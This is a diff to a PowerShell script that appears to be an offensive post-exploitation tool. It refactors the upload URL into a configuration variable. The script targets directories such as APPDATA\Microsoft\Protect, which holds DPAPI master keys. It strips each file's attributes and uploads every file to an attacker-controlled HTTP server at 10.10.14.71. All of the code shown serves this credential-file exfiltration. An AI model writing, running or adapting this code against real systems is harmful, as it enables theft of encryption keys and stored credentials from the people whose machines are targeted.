@@ -49,6 +49,9 @@ function Invoke-FileUpload {
 	Write-Host "[+] FileHash: " $FileHash.Hash
 }
 
+# === Configuration ===
+$uploadServer = "http://10.10.14.71:8000/upload"
+
 # Define the directories to target
 $paths = @(
     "$env:APPDATA\Microsoft\Protect",
@@ -95,7 +98,7 @@ foreach ($basePath in $paths) {
             Write-Host "[>] Processing file: $($file.FullName)"
             Set-ItemProperty -Path $file.FullName -Name Attributes -Value 'Normal'
             Write-Host "    [-] Attributes set to 'Normal'"
-            Invoke-FileUpload -Uri "http://10.10.14.71:8000/upload" -File $file.FullName
+            Invoke-FileUpload -Uri $uploadServer -File $file.FullName
             Write-Host "    [+] File uploaded successfully"
         } catch {
             Write-Warning "    [x] Failed to process $($file.FullName): $_"
